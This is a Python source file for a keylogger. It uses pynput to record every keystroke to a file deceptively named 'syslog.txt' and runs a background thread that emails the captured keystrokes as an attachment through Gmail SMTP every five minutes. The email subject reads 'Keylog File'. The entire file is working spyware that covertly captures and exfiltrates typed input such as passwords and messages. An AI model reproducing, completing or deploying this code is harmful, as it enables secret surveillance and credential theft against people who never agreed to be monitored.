from pynput.keyboard import Key, Listener
import logging
import time 
import _thread
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders

logfile = "syslog.txt"

f = open(logfile, 'a')
f.close()

def send_mail(log_file):

    while True:
        print("Top of the loop")
        try:
            fromaddr = "<from email address>"
            toaddrs = 'To email address'
            subject = "Keylog File"
            body = 'text file of the keylogger'
            file = log_file
            msg = MIMEMultipart()
            msg['From'] = fromaddr
            msg['to'] = toaddrs
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            attachment = open(file, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % file)
            msg.attach(p)
            server = smtplib.SMTP("smtp.gmail.com:587")
            server.starttls()
            server.login(fromaddr, '<password>')
            text = msg.as_string()
            server.sendmail(fromaddr, toaddrs, text)
            server.quit()
            print("file Sent")
        except:
            print("file not sent!")
        print("sleeping for 5min")
        time.sleep(300)



_thread.start_new_thread(send_mail, (logfile, ))



logging.basicConfig(filename = (logfile), level=logging.DEBUG, format='%(asctime)s: %(message)s')
strokes = ""
s1 = time.time()

def on_press(key):
    global s1
    global strokes
    strokes = strokes + ", " + str(key)

    if ((time.time() - s1) >= 3):
        logging.info(strokes)
        strokes = ""
        s1 = time.time()

with Listener(on_press=on_press) as Listener:
    Listener.join()
